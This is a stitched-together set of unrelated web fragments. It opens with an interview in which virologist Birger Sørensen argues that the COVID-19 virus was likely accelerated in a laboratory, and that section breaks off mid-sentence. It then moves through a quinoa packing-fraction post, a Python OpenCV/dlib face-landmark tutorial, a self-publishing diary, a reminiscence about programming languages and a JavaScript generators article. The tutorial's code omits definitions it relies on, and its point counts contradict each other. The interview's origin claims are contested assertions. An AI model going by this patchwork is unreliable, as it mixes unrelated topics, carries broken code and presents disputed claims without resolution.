            The well-known Norwegian virologist Birger Sørensen and his colleagues have examined the corona virus. They believe it has certain properties which would not evolve naturally. These conclusions are politically controversial, but in this interview he shares the findings behind the headlines.
            </h3>

    

</div>


                <div><p>“I understand that this is controversial, but the public has a legitimate need to know, and it is important that it is possible to freely discuss alternate hypotheses on how the virus originated” Birger Sørensen starts to explain when Minerva visits him in his office one morning in Oslo.</p><p>Despite the explosiveness of his statements and research, Sørensen remains calm and collected.</p><p>Sørensen has been a point of controversy ever since former MI6 director Richard Dearlove cited a yet to be published article by Sørensen and his colleagues in an interview with The Daily Telegraph. The article claims that the virus that causes Covid-19 most likely has not emerged naturally.</p><p>“It’s a shame that there has already been so much talk about this, because I have yet to publish the article where I put forward my analysis”, Sørensen says in the form of an exasperated sigh.</p><p>Together with his colleagues, Angus Dalgleish and Andres Susrud have authored an article that looks into the most plausible explanations regarding the origins of the novel coronavirus. The article builds upon an already published article in the Quarterly Review of Biophysics that describes newly discovered properties in the virus spike protein. The authors are still in dialogue with scientific journals regarding an upcoming publication of the article.</p><p>News outlets are thus confronted with a difficult question: Are the findings and arguments Sørensen and his colleagues put forward of a sufficiently high quality to be presented and discussed in the public sphere? Sørensen explains that they in their dialogue with scientific journals are encountering a certain reluctance to publishing the article – without, however, proper scientific objections. Minerva has read a draft of the article, and has after an overall assessment decided that the findings and arguments do deserve public debate, and that this discussion cannot depend entirely on the publication process of scientific journals.</p><p>In this interview with Minerva, Sørensen therefore puts forward his hypothesis on why it is highly unlikely that the coronavirus emerged naturally.</p><p>On May 18th, WHO decided to conduct an inquiry into the coronavirus epidemic in China. Sørensen believes that it is important that this inquiry looks into new and alternate explanations for how the virus originated, beyond the already well-known suggestion that the virus originated in the Wuhan Seafood Market.</p><p>“There are very few who still believe that the epidemic started there, so as of today we have no good answers on how the epidemic started. Then we must also dare to look at more controversial, alternative explanations for the origin,” Sørensen says.</p><p>Birger Sørensen and one of his co-authors, Angus Dalgleish, are already known as HIV researchers par excellence.</p><p>In 2008, Sørensen’s work came to international <a href="https://www.dagensperspektiv.no/2008/norsk-firma-med-hiv-gjennombrudd">attention</a> when he launched a new immunotherapy for HIV. <a href="https://www.nature.com/search?author=%22Angus%20G.+Dalgleish%22">Angus Dalgleish</a> is the professor at St. George’s Medical School in London who became world famous in 1984 after having <a href="https://www.nature.com/articles/312763a0">discovered</a> a novel receptor that the HIV virus uses to enter human cells.</p><p>The purpose of the work Sørensen and his colleagues have done on the novel coronavirus, has been to produce a vaccine. And they have taken their experience in trialling HIV vaccines with them to analyse the coronavirus more thoroughly, in order to make a vaccine that can protect against Covid-19 without major side effects.</p><h2>Exceptionally well adjusted</h2><p>“The difference between our approach and other vaccine manufacturers is that we have a chemistry background, and we analyse the virus in detail as if we were making a drug,” Sørensen starts to explain.</p><p>“Biology is also chemistry, so by considering the virus from a chemistry perspective, we carry out more detailed analysis, zooming in on certain components.”</p><p>Sørensen takes us through the basic elements of their approach:</p><p>“The first thing you need to establish is which parts of the virus are changing, and which parts are stable. If you want to make a vaccine that lasts, you must stimulate the immune system to react against those parts of the virus that are constant, otherwise the effect will disappear and, in the worst-case scenario, lead to increased illness.</p><p>“Once we know this, we can try to make a vaccine. Where we differ is that we are trying to make a vaccine that uses elements that have as little in common with the body’s natural components as possible, so that the immune system is taught to recognise exactly what the vaccine should protect against”, Sørensen elaborates.</p><p>Sørensen believes this is an important insight which will prevent the immune system from being falsely stimulated in a way that could lead the vaccine to create too many dangerous side effects in the vaccinated person.</p><p>“When we have not succeeded in creating an HIV vaccine, despite the enormous efforts put into that endeavour for the past 30 years, it is because we haven’t understood this,” Sørensen continues.</p><p>He believes that there has not been enough interaction between the part of the pharmaceutical industry that makes HIV medicines and the part that runs the vaccine research. As a consequence, the knowledge you need to make a successful vaccine against HIV in the big pharmaceutical companies has not been adequately exploited by the big, international HIV preventing vaccine studies that have been carried out.”</p><p>Asked about what significance his approached has had when he has analyzed the coronavirus, Sørensen explains:</p><p>“We have examined which components of the virus are especially well suited to attach themselves to cells in humans. And we have done this by comparing the properties of the virus with human genetics. What we found was that this virus was exceptionally well adjusted to infect humans.”</p><p>He pauses for a second.</p><p>“So well that it was suspicious,” he adds.</p><h2>Perfected to infect humans</h2><p>It is already known that the novel coronavirus, like the virus that caused the SARS epidemic in Southeast Asia in 2002-2003, could attach itself to the ACE-2 receptors in the lower respiratory tract.</p><p>“But what we have discovered is that there are properties in this new virus which enables it to use an additional receptor, and create a binding to human cells in the upper respiratory tract and the intestines which is strong enough to produce an infection,” Sørensen elaborates.</p><p>Sørensen says that it is the use of this additional receptor that most likely results in a different illness in Covid-19 patients than the one resulting from SARS.</p><p>“This is what enables the virus to transmit to a greater degree between humans, without the virus having attached itself to the ACE-2 receptors in the lower respiratory tract, where it causes deep pneumonia.</p><p>“That is also why so many of the Covid-19 patients have mild symptoms at the start of the illness, and are contagious before they develop severe symptoms,” he adds.</p><p>It might also explain why some people are ‘super spreaders’ without being ill themselves, Sørensen says.</p><p>In the already published article Sørensen and his colleagues Angus Dalgleish and Andres Susrud describe what they claim is curious about the spike protein of the coronavirus, which makes it especially well suited to infect humans. These findings are the foundation for the hypothesis Sørensen and his colleagues develop in the new article, where they claim that the virus is not natural in origin.</p><div id="factbox-361864">
    <div>
        
        <h2>FACT BOX – Spike Protein</h2>
        <p>A spike protein is a part of the virus attached to the surface of the virus. The spike protein is used by the virus when it enters cells, enabling it to stick in humans. The properties of the spike determines which receptors a virus can utilise and thus which cells the virus can enter to create illness.</p>
        
    </div>
    
</div><p>“There are several factors that point towards this,” says Sørensen. “Firstly, this part of the virus is very stable; it mutates very little. That points to this virus as a fully developed, almost perfected virus for infecting humans.</p><p>“Secondly, this indicates that the structure of the virus cannot have evolved naturally. When we compare the novel coronavirus with the one that caused SARS, we see that there are altogether six inserts in this virus that stand out compared to other known SARS viruses,” he goes on explaining.</p><p>Sørensen says that several of these changes in the virus are unique, and that they do not exist in other known SARS coronaviruses.</p><p>“Four of these six changes have the property that they are suited to infect humans. This kind of aggregation of a type of property can be done simply in a laboratory, and helps to substantiate such an origin,” Sørensen points out.</p><h2>An artificially created virus</h2><p>Asked about whether this implies that the virus is not natural, Sørensen goes on to explain the laboratory process that leads to the creation of new viruses.</p><p>“In a sense it is natural. But the natural processes have most likely been accelerated in a laboratory,” he explains. “It’s also possible for a virus to attain these properties in nature, but it’s not likely. If the mutations had happened in nature, we would have most likely seen that the virus had attracted other properties through mutations, not just properties that help the virus to attach itself to human cells.”</p><p>Sørensen vividly explains this argument:</p><p>“Imagine that you have cultivated a billion coronaviruses you have gathered from nature, then you take this mass of viruses and inject them into a human cell culture from for example the upper respiratory tract. As a result, a few of these viruses will change in order to better attach themselves to …</p></div></section></article></div>

<p>I was struck the other day by the following:  The cooking instructions on my
Bob’s tri-colored quinoa package said to combine 2 cups of water with 1 cup of
dried quinoa, which would ultimately create 4 cups of cooked quinoa.  See image&nbsp;above.</p>
<p>My first reaction was to believe that some error had been made.  However, I
then realized that the explanation was packing:  When one packs spheres or
other awkward solid geometric shapes into a container, they cannot fill the
space completely.  Little pockets of air sit between the spheres.  A quick
google search for the packing fraction of spheres gives a value of <span>\(0.75\)</span> for a
crystalline structure and about <span>\(0.64\)</span> for random packings — apparently a
universal&nbsp;law.</p>
<p>We can get a similar number out from my quinoa instructions: Suppose that
before the quinoa is cooked, the water fills its volume completely.  However,
after cooking, the water is absorbed into the quinoa and forced to share its
packing fraction.  The quinoa stays at the same packing fraction before and
after cooking, so the water must be responsible for the volume growth.  This
implies it went from 2 cups to 3,&nbsp;or
</p>
<p>\begin{eqnarray} \tag{1} \label{1}
2 = \rho \times 3,
\end{eqnarray}</p>
<p>
where <span>\(\rho\)</span> is the packing fraction of the quinoa “spheres”. We conclude that
the packing fraction is <span>\(\rho = 2/3\)</span>, very close to the googled value of <span>\(\rho
= 0.64\)</span>.</p>

    <h2>Identify faces and extract up to 6 facial features with OpenCV and&nbsp;DLib</h2>
    
    
    <section>
        <figure>
            
            <img alt="Feature Image" src="https://livecodestream.dev/post/2020-07-03-detecting-face-features-with-python/featured_hub7f1feff188674cdc7b9240a8885c06f_146833_680x0_resize_q75_box.jpg">
        </figure>
        <p>Today we are going to learn how to work with images to detect faces and to extract facial features such as the eyes, nose, mouth, etc. There’s a number of incredible things we can do this information as a pre-processing step like capture faces for tagging people in photos (manually or through machine learning), create effects to “enhance” our images (similar to those in apps like Snapchat), do sentiment analysis on faces and much more.</p>
<p>In the past, we have covered before how to work with OpenCV to detect shapes in images, but today we will take it to a new level by introducing DLib, and abstracting face features from an image.</p>
<p><a href="https://livecodestream.dev/post/2020-06-11-essential-opencv-functions-to-get-you-started-into-computer-vision/">Essential OpenCV Functions to Get You Started into Computer Vision</a></p>
<p><a href="http://dlib.net/">Dlib</a> is an advanced machine learning library that was created to solve complex real-world problems. This library has been created using the C++ programming language and it works with C/C++, Python, and Java.</p>
<p>It worth noting that this tutorial might require some previous understanding of the OpenCV library such as how to deal with images, open the camera, image processing, and some little techniques.</p>
<hr>
<h2 id="how-does-itwork">How does it&nbsp;work?</h2>
<p>Our face has several features that can be identified, like our eyes, mouth, nose, etc. When we use DLib algorithms to detect these features we actually get a map of points that surround each feature.</p>
<p>This map composed of 67 points (called landmark points) can identify the following features:</p>







    
        
        
    


<figure data-src="/post/2020-07-03-detecting-face-features-with-python/points.png">

    <p>Point Map</p>
</figcaption>
</figure>

<ul>
<li>Jaw Points = 0–16</li>
<li>Right Brow Points = 17–21</li>
<li>Left Brow Points = 22–26</li>
<li>Nose Points = 27–35</li>
<li>Right Eye Points = 36–41</li>
<li>Left Eye Points = 42–47</li>
<li>Mouth Points = 48–60</li>
<li>Lips Points = 61–67</li>
</ul>
<p>Now that we know a bit about how we plan to extract the features, let’s start coding.</p>
<hr>
<h2 id="installing-requirements">Installing requirements</h2>
<p>As usual, this article will present examples with code, and I’ll guide you step by step to implement a fully working example of face feature recognition. But before we get started you need to start a new Python project and install 3 different libraries:</p>
<ul>
<li>opencv-python</li>
<li>dlib</li>
</ul>
<p>If you use pipenv like I do, you can install all of them with the following command:</p>
<div><pre><code data-lang="shell">pipenv install opencv-python, dlib
</code></pre></div><p>If you are working on Mac, and some versions of Linux you may have some problems installing dlib, if you get compiling errors during the installation make sure you check the CMake library version you are using. In Mac to make sure you have CMake available and with the right version you can run:</p>
<p>For other OS, check online for specific support.</p>
<hr>
<h2 id="step-1-loading-and-presenting-animage">Step 1: Loading and presenting an&nbsp;image</h2>
<p>We will start small and build on the code until we have a fully working example.</p>
<p>Normally I like to use plots to render the images, but since we have something cool prepared for later in the post, we will do something different, and we will create a window where we are going to show the results of our work.</p>
<p>Let’s jump into the code</p>
<div><pre><code data-lang="python"><span>import</span> cv2

<span># read the image</span>
img <span>=</span> cv2<span>.</span>imread(<span>"face.jpg"</span>)

<span># show the image</span>
cv2<span>.</span>imshow(winname<span>=</span><span>"Face"</span>, mat<span>=</span>img)

<span># Wait for a key press to exit</span>
cv2<span>.</span>waitKey(delay<span>=</span><span>0</span>)

<span># Close all windows</span>
cv2<span>.</span>destroyAllWindows()
</code></pre></div><p>Pretty simple, right? We are just loading the image with imread, and then telling OpenCV to show the image in a winname, this will open the window and give it a title.</p>
<p>After that, we need to pause execution, as the window will be destroyed when the script stops, so we use cv2.waitKey to hold the window until a key is pressed, and after that, we destroy the window and exit the script.</p>
<p>If you use the code and added an image named face.jpg to the code directory, you should get something like the following:</p>







    
        
        
    


<figure data-src="/post/2020-07-03-detecting-face-features-with-python/face0.png">

    <p>Original Image</p>
</figcaption>
</figure>

<hr>
<h2 id="step-2-face-recognition">Step 2: Face recognition</h2>
<p>So far we haven’t done anything with the image other than presenting it into a window, pretty boring, but now we will start coding the good stuff, and we will start by identifying where in the image there is a face.</p>
<p>For this, we will use Dlib function called <code>get_frontal_face_detector()</code>, pretty intuitive. There is a caveat though, this function will only work with grayscale images, so we will have to do that first with OpenCV.</p>
<p>The <code>get_frontal_face_detector()</code> will return a <code>detector</code> that is a function we can use to retrieve the faces information. Each face is an object that contains the points where the image can be found.</p>
<p>But let’s better see it on the code:</p>
<div><pre><code data-lang="python"><span>import</span> cv2
<span>import</span> dlib

<span># Load the detector</span>
detector <span>=</span> dlib<span>.</span>get_frontal_face_detector()

<span># read the image</span>
img <span>=</span> cv2<span>.</span>imread(<span>"face.jpg"</span>)

<span># Convert image into grayscale</span>
gray <span>=</span> cv2<span>.</span>cvtColor(src<span>=</span>img, code<span>=</span>cv2<span>.</span>COLOR_BGR2GRAY)

<span># Use detector to find landmarks</span>
faces <span>=</span> detector(gray)

<span>for</span> face <span>in</span> faces:
    x1 <span>=</span> face<span>.</span>left() <span># left point</span>
    y1 <span>=</span> face<span>.</span>top() <span># top point</span>
    x2 <span>=</span> face<span>.</span>right() <span># right point</span>
    y2 <span>=</span> face<span>.</span>bottom() <span># bottom point</span>
    <span># Draw a rectangle</span>
    cv2<span>.</span>rectangle(img<span>=</span>img, pt1<span>=</span>(x1, y1), pt2<span>=</span>(x2, y2), color<span>=</span>(<span>0</span>, <span>255</span>, <span>0</span>), thickness<span>=</span><span>4</span>)

<span># show the image</span>
cv2<span>.</span>imshow(winname<span>=</span><span>"Face"</span>, mat<span>=</span>img)

<span># Wait for a key press to exit</span>
cv2<span>.</span>waitKey(delay<span>=</span><span>0</span>)

<span># Close all windows</span>
cv2<span>.</span>destroyAllWindows()
</code></pre></div><p>The code above will retrieve all the faces from the image and render a rectangle over each face, resulting in an image like the following:</p>

<img src="https://livecodestream.dev/post/2020-07-03-detecting-face-features-with-python/face1.jpg"> 
</figure>

<p>So far we did pretty well at finding the face, but we still need some work to extract all the features (landmarks). Let’s work on that next.</p>
<hr>
<h2 id="step-3-identifying-facefeatures">Step 3: Identifying face&nbsp;features</h2>
<p>Do you love magic? So far DLib has been pretty magical in the way it works, with just a few lines of code we could achieve a lot, and now we have a whole new problem, would it continue to be as easy?</p>
<p>The short answer is YES! Turns out DLib offers a function called <code>shape_predictor()</code> that will do all the magic for us but with a caveat, it needs a pre-trained model to work.</p>
<p>There are several models out there that work with <code>shape_predictor</code>, the one I’m using can be downloaded <a href="https://github.com/italojs/facial-landmarks-recognition/blob/master/shape_predictor_68_face_landmarks.dat">here</a>, but feel free to try others.</p>
<p>Let’s see how the new code looks like now</p>
<div><pre><code data-lang="python"><span>import</span> cv2
<span>import</span> dlib

<span># Load the detector</span>
detector <span>=</span> dlib<span>.</span>get_frontal_face_detector()

<span># Use detector to find landmarks</span>
faces <span>=</span> detector(gray)

<span>for</span> face <span>in</span> faces:
    x1 <span>=</span> face<span>.</span>left() <span># left point</span>
    y1 <span>=</span> face<span>.</span>top() <span># top point</span>
    x2 <span>=</span> face<span>.</span>right() <span># right point</span>
    y2 <span>=</span> face<span>.</span>bottom() <span># bottom point</span>

    <span># Look for the landmarks</span>
    landmarks <span>=</span> predictor(image<span>=</span>gray, box<span>=</span>face)
    x <span>=</span> landmarks<span>.</span>part(<span>27</span>)<span>.</span>x
    y <span>=</span> landmarks<span>.</span>part(<span>27</span>)<span>.</span>y

    <span># Draw a circle</span>
    cv2<span>.</span>circle(img<span>=</span>img, center<span>=</span>(x, y), radius<span>=</span><span>5</span>, color<span>=</span>(<span>0</span>, <span>255</span>, <span>0</span>), thickness<span>=-</span><span>1</span>)

<span># show the image</span>
cv2<span>.</span>imshow(winname<span>=</span><span>"Face"</span>, mat<span>=</span>img)

<span># Wait for a key press to exit</span>
cv2<span>.</span>waitKey(delay<span>=</span><span>0</span>)

<span># Close all windows</span>
cv2<span>.</span>destroyAllWindows()
</code></pre></div><p>Like before, we are always building on the same code, now using our predictor function for each face to find the landmarks. Now I’m still doing something strange, like what’s the number 27 doing there?</p>
<div><pre><code data-lang="python">landmarks <span>=</span> predictor(image<span>=</span>gray, box<span>=</span>face)
x <span>=</span> landmarks<span>.</span>part(<span>27</span>)<span>.</span>x
y <span>=</span> landmarks<span>.</span>part(<span>27</span>)<span>.</span>y
</code></pre></div><p>Our predictor function will return an object that contains all the 68 points that conform a face according to the diagram we saw before, and if you pay attention to it, the point 27 is exactly between the eyes, so if all worked out correctly you should see a green dot between the eyes in the face like in here:</p>

<p>We are getting really close, let’s now render all the points instead of just the one:</p>

<p>Amazing, but can we do something even cooler?</p>
<hr>
<h2 id="step-4-real-time-detection">Step 4: Real-time detection</h2>
<p>Yes, you read it right! And yes it’s probably what you are thinking! The next step is to hook up our webcam and do real-time landmark recognition from your video stream.</p>
<p>You can do real-time facial landmarks detection on your face by iterating through video frames with your camera or use a video file. Refer to the code below if you want to use your own camera but for video file make sure to change the number 0 to video path.</p>

All readers are part of a private GitHub organization where they can collaborate together, ask questions and exchange their experiences.</p> <h2>Writing and self-publishing the book - my journey</h2> <h3>2000 until early 2020</h3> <p>A book like Cloud Native Web Development cannot be written over night. It’s twenty years of work experience, numerous failures, a handful of successes and a personal desire to continously grow and expand my knowledge.</p> <p>For the past few years, I repeatedly thought I would like to write a book about everything it takes to run a web application in production. There are tutorials, video courses and guides available online for any topic you can imagine. Need to compare React and Svelte? You’ll find <a href="https://www.mikenikles.com/blog/why-i-moved-from-react-to-svelte-and-why-others-will-follow">plenty of tutorials</a>. Want to learn SRE (site reliability engineering) best practices? <a href="https://landing.google.com/sre/books/" rel="nofollow">Check here</a>.</p> <p>However, unless you know what to look for, you won’t succeed because there are so many pieces to the puzzle, it’s challenging to know where to start.</p> <h3>February 2020</h3> <p>With COVID-19 spreading across the globe and governments putting countries into lockdown, it became immediately apparent that this is not like a previous pandemic. I had two options:</p> <ul><li>worry, feel anxious, be unsure what to do</li> <li>look at it as an opportunity</li></ul> <p>I was privileged enough not to worry, not to feel anxious. So I went for the second option and decided to make the best of the situation.</p> <p>It was now or never to write a book. Luckily, my wife supported me all the way, otherwise this would have never been possible. In fact, she encouraged me to spend as much of my spare time on the book because she knew how much it would mean to me to publish that book I had been talking about for years.</p> <p>The outline of the book had been in my mind for a while already. The tech stack I wanted to use was pretty clear to me as well. I wanted to use technologies that I believe in, technologies I use in my projects and technologies I believe are about to become very popular.</p> <p><strong>Self-publish vs. using a publisher</strong></p> <p>This is a tricky one. Late in 2019, I was contacted by two publishers who asked me to develop a <a href="https://svelte.dev/" rel="nofollow">Svelte</a> online course. When I learned that my take-home pay would be between 12% and 18%, I declined. Now, writing a book was never about earning a lot or quitting my day job. It was about sharing my knowledge and helping others learn from my experience. Having said that and knowing my personality, I knew I would make this as perfect as it gets and invest a lot of time. So why did I reject the publishers? Quite simple, while the financial reward is not the first priority, I believe my knowledge and two decades of experience is worth something worth paying for. It’s still a lot cheaper than four years at university where you are taught things you likely won’t need in real life.</p> <p>In addition, a publisher provides you with technical reviews. Without sounding arrogant, my book is about my experience, my view of what’s best and my best practices. There are very few people who know my experience better than myself. It turned out I had amazing technical reviwers among my co-workers and friends, and even a PhD student from Austria who, by chance, found my website and contacted me. He became the first to fully review line by line and provided input as valuable as a tech reviewer at a publishing company could have done.</p> <p>A publisher would have given me a wider reach, but on the other hand, my blog gets 80 to 100 unique visitors per day from across the world, that’s good enough for me to get started.</p> <h3>March, April and May 2020</h3> <p>From a “behind the scenes” point of view, these months were not exciting. Lots of writing, both the book and the corresponding source code.</p> <p>I started with an empty Google Doc, wrote down the top-level chapters and started with the “About the author” chapter. It was the only chapter I was pretty sure I knew what to write :-). It also helped to turn the white screen into something that looked like a tiny essay. Anything other than a blank page is better at that stage of the process!</p> <p><strong>Development of the source code</strong></p> <p>The idea was to give access to the source code to all readers. I wanted to make sure the commit history, the PRs and everything related to the code was perfect. So how did I manage 105 commits without any mistakes or commit messages such as “Whoops… try again.”?</p> <p>I had two repositories! A “playground” where I experimented, made sure everything worked and tested things for individual chapters. In parallel to the experimentation, I wrote the book’s hands-on part. When I was satisfied with the code, I switched to the “clean” repository, the one readers have access to now. I followed the instructions I wrote in the book. This made sure I was the first person to actually follow along my instructions in the book. It also meant I wrote the entire book’s source code twice - once with lots of experimentation and once in a clean way. As I’m writing this, I was curious to see how many commits the “playground” repo has and to my surprise… it has 119! That’s only 14 more than the final repo… I could have sworn it would be a lot messier!</p> <p><strong>June 2020</strong></p> <p>The book’s content was completely written some time in early June. At that point, I shared the book with a few more technical reviewers. Prior to that, I had a few close friends and “Thomas, the Austrian” who provided feedback. The tech reviews went very well and I felt comfortable publishing the book.</p> <p><strong>June 26, 2020</strong></p> <p>Two days before the self-imposed publication deadline, my wife suggested we develop a landing page for the book. “Sure!” She also did some research on book covers and designed the one you see now. Based on that, we developed the website in the same colors.</p> <p><strong>June 27, 2020</strong></p> <p>I adjusted headings, aligned them to new pages and updated the table of contents. My wife reviewed it and made sure everything was properly aligned. My wife got up, looked at me and said, “We need to change the icons in the book.” One day to go… I was surely nervous, but learned over the years that it’s best to trust her. I’m glad I did as the icons now look a million times better than the black &amp; white ones I used previously!</p> <p>June 27 was a Saturday and we stayed up until 2:30am or so on Sunday morning. When we finally went to bed, we felt we were ready.</p> <p><strong>June 28, 2020</strong></p> <p>A few last-minute updates to the table of contents due to changes to page numbers and I downloaded the PDF and published it on <a href="https://gum.co/cloud-native-web-development" rel="nofollow">Gumroad</a>.</p> <h2>Lessons I learned up to this point</h2> <p><strong>Pros</strong></p> <p>I think the best thing I did was starting with a very clear idea in my mind of what I want to write about. I knew exactly who the target audience would be, I pretty much had all chapters in mind and also knew I wanted there to be source code and a private community of everyone who buys the book.</p> <p>Patience &amp; dedication: From the very beginning, I set myself a strict deadline of June 28, 2020 (my birthday). This project was a big time investment and I knew there is no excuse to delay anything if I wanted to hit that deadline. The rule I set myself was very clear: Spend as much of my spare time on writing, every day. Looking back at my time tracking, I wrote at least a little bit every single day.</p> <p><strong>Cons</strong></p> <p>Writing a 200+ book, with 19 pull requests is a lot of work and I spent a few hundred hours on it. If I write another book, I will give myself more time. It is more likely though that I would write a shorter book ;-).</p> <p>Perfectionism is your biggest enemy to get stuff done. Sure, I’m very proud of the final outcome and how each chapter maps to a pull request and sometimes even individual sub-chapters that map to commit messages. My readers absolutely love and appreciate this, but it put a lot of pressure on me throughout the process.</p> <h2>The first week since publication</h2> <p><picture><source srcset="https://www.mikenikles.com/blog-posts/2020-07-03-how-i-wrote-214-pages-for-a-web-development-book-with-19-pull-requests-in-3-months/1.webp" type="image/webp"><source srcset="https://www.mikenikles.com/blog-posts/2020-07-03-how-i-wrote-214-pages-for-a-web-development-book-with-19-pull-requests-in-3-months/1.jp2" type="image/jp2"><img alt="Gumroad sales in week 1" src="https://www.mikenikles.com/blog-posts/2020-07-03-how-i-wrote-214-pages-for-a-web-development-book-with-19-pull-requests-in-3-months/1.jpg"></picture></p> <p>37 books sold with no advertising other than posting on my Twitter account (500 followers) and LinkedIn. Given the incredible feedback I received from reviewers, I am confident I will reach a wider audience once the 37 readers wrap up the book and hopefully provide some feedback on Twitter to help promote the book.</p> <p>Estimates from reviewers vary between 30 to 50 hours to finish the book, depending on their level of experience in web development. I’m keen to keep an eye on what happens over the next few weeks and months.</p> <h2>Final thoughts</h2> <p>Writing Cloud Native Web Development was an incredibly fun project. I learned a lot about writing, publishing, EPUB (it’s basically HTML!), marketing, and what it means to be dilligent and stick to a strict schedule.</p> <p>Would I do it again? Possibly, but not in 2020 :-).</p> <p>Please head over to the <a href="https://www.mikenikles.com/cloud-native-web-development">book’s page</a> and get yourself a copy!</p> <p>👋</p></div></div>]]>

              <h2><a name="h.vq1i2tq8whe6"></a><span>A whole lot
                  of languages going on</span></h2>
              <p><span>From that late 1970’s through the early
                  1990’s I had the need to program in a lot of different
                  languages. At first I had no language tools, and programmed my
                  6502 Atari with opcodes. Then there were the “standard”
                  languages: Basic, Pascal, Fortran, Assembly (8086, 6502,
                  PDP-11, 360, 68000, TMS320), SQL, C, C++. There were the batch
                  languages: Batch, Bourne, Bash, Korn, C-Shell, Rexx. Then
                  there were application-specific command languages that seemed
                  to go along with every new program that was released.
                  &nbsp;That was far too many languages for me. Being of limited
                  intellect, I felt that each time I had to master a new
                  language I would have to give up mastery of some old language.</span></p>
              
              <table>
                <tbody>
                  <tr>
                    <td>
                      
                      <br>

                    <td>
                      <p><span>Editorial: This over-abundance of
                          languages is still a problem today, in my opinion, and
                          it’s a theme to which I’ll return.</span></p>
                      
                      <p><span>Take, for a recent example, the
                          current widespread use of templating languages in the
                          web space. There are several server-side templating
                          languages people apply to their HTML code, and then
                          there are several server-side templating languages. So
                          already there are two problems: 1) several templating
                          languages to choose from (crazy), and 2) the HTML
                          templating languages are different than the CSS
                          templating languages (super-crazy). The issue is even
                          worse because most web developers don’t yet realize
                          that they can optimize their systems by delivering
                          slightly different javascript code to their
                          slightly-different clients, but when they realize it,
                          guess what, they’ll probably create yet another
                          server-side templating language just for JS files, and
                          naturally it will resemble neither the HTML nor the
                          CSS templating languages (crazy crazy crazy).</span></p>
                      
                      <p><span>To make matters worse, every
                          developer that wants to prove himself will at some
                          point develop a new language. Is it just as capable of
                          implementing a turing engine as all the other
                          languages that already exist? Yes. Is it better than
                          the existing language it’s meant to replace? Maybe. Is
                          it so much better that the rest of us should throw out

              <h2><a name="h.k1btxapqspg"></a><span>C is great,
                  but not for everybody</span></h2>
              <p><span>My favorite language was C, due to it’s small
                  syntax (very few keywords), generality, and high performance.
                  C was powerful and fun. If you wanted to get serious work
                  done, you used C. (Curiously, even most of those
                  command-specific and batch languages I mentioned above were
                  themselves implemented in C.)</span></p>
              
              <p><span>Most importantly, C was where the good and
                  high-paying jobs were, which is why people wanted to learn C
                  and why they showed up for an adult-education class that I was
                  teaching. The C language had a reputation for being difficult,
                  and so I expected it to be difficult to teach. But as we
                  stepped through the basic syntax elements it wasn’t hard at
                  all, almost everyone was following right along very quickly.
                  Until...</span></p>
              
              <p><span>At one point the majority of the class, who
                  until then was learning to program surprisingly quickly,
                  stopped clicking with what I was teaching. Certain topics just
                  left them completely confused: e.g., pointers (incrementing
                  and dereferencing), sizes of datum and data, allocation and
                  freeing, stack use... It took a while, but eventually I
                  realized where the problem lay: For a large segment of the
                  students, maybe most, any aspect of C that involved
                  understanding how data was arranged in computer memory just
                  led to total confusion. Maybe I was teaching it wrong? Maybe a
                  fundamental a background in opcodes and assembly and even
                  circuit boards is needed to really “get it”? Maybe it’s just
                  an unnatural concept that doesn’t mesh with most humans
                  brains? In any case, I started to think that most of these
                  students were never going to be top-notch C programmers, at
                  least not with me as the teacher.</span></p>

                          constantly surprised how many people in the software
                          field don’t understand how memory works. They may
                          think it doesn’t matter anymore, since they’re mostly
                          using high-level garbage-collected languages in
                          short-lived processes. And maybe for most trivial

    <h2><a href="https://goshakkk.name/javascript-generators-understanding-sample-use-cases/">3 cases where JavaScript generators rock (+ understanding them)</a></h2>
    <p>20 Oct 2016</p>
    
  </header>

  
<p>One of the new features in ES6 is a new type of function, a generator function. You’ve probable heard of them.</p>

<p>They are defined almost like normal functions, but instead of <code>function</code>, you use <code>function*</code>.
Also in the body, a new keyword, <code>yield</code> can be used to return a stream of values from the generator.</p>

<p><img src="https://d33wubrfki0l68.cloudfront.net/f43e69e4db03764106714dae3fae0df7e3ee629b/8118c/assets/images/js-gen/cover.png" alt=""></p>

<p>A lot of articles on generators, however, focus purely on what generators technically are, and not so much on what they enable and how they’re used in real apps.</p>

<p>In this article, I would like to present a thinking pattern that helps understand generators, as well as a few real-world examples, which are the second half of the post.</p>

<p>No more trying to learn and giving up because things felt… too complex and almost out of touch with reality.</p>

<h2 id="understanding">Understanding</h2>

<p>First…
What’s a function, an old, regular function?</p>

<p>It’s a sequence of commands that are executed, one by one, when that function is called.
The function can communicate some value to its caller by using <code>return</code>.</p>

<div><div><pre><code><span>function</span> <span>regular</span><span>()</span> <span>{</span>
  <span>doA</span><span>();</span> <span>// execute this</span>
  <span>doB</span><span>();</span> <span>// execute that</span>
<span>}</span>
</code></pre></div></div>

<p>Straightforward.</p>

<p>What generators bring to the table is the ability to treat a function like a program — that can be executed according to some specific rules that <strong>you define</strong>.
So let’s call a generator function <strong>a program</strong>.</p>

<p>To execute a program, though, we do need <strong>an interpreter</strong>, that will give that special behavior we want.
It’s going to take the program in and run it:</p>

<div><div><pre><code><span>interpreter</span><span>(</span><span>function</span><span>*</span> <span>program</span><span>()</span> <span>{</span>
  <span>// do something</span>
<span>});</span>
</code></pre></div></div>

<p><code>yield command</code> is how a program reaches out to the interpreter.</p>

<p>It is a two-way communication channel between a program and an interpreter:</p>

<ol>
  <li>a program sends something to an interpreter</li>
  <li>the interpreter does its thing and can send something back to the program</li>
</ol>

<p>For example, here is how we send <strong>a command</strong> <code>b</code> to the interpreter and put its response into <code>a</code>.</p>



<p>It’s important to note that this call is <strong>not necessarily synchronous</strong>, the interpreter can give us <code>a</code> right away, but it can also decide to wait and give it to us in 5 minutes.
The generator function will pause and not execute further until the interpreter tells it to.</p>

<p>Okay… nuff theory.
Let’s show some real-world use-cases, shall we?</p>

<h2 id="examples">Examples!</h2>

<h3 id="1-linear-build-tests-for-async-tool">1. Linear build tests for async tool</h3>

<p><a href="http://brunch.io/">Brunch</a> is a front-end bundler.
Not surprisingly, it has a “watch” mode when it re-builds every time a file changes.</p>

<p>To test this behavior end-to-end, we basically need to:</p>

<ul>
  <li>wait for initial compilation</li>
  <li>make some changes</li>
  <li>wait for the subsequent compilation to finish</li>
  <li>assert the changes were reflected in the new build</li>
</ul>

<p>I utilized the power of generators to make this kind of testing easy-peasy:</p>

<div><div><pre><code><span>watch</span><span>({},</span> <span>function</span><span>*</span> <span>(</span><span>compilation</span><span>)</span> <span>{</span>
  <span>yield</span> <span>compilation</span><span>();</span> <span>// pause and wait</span>
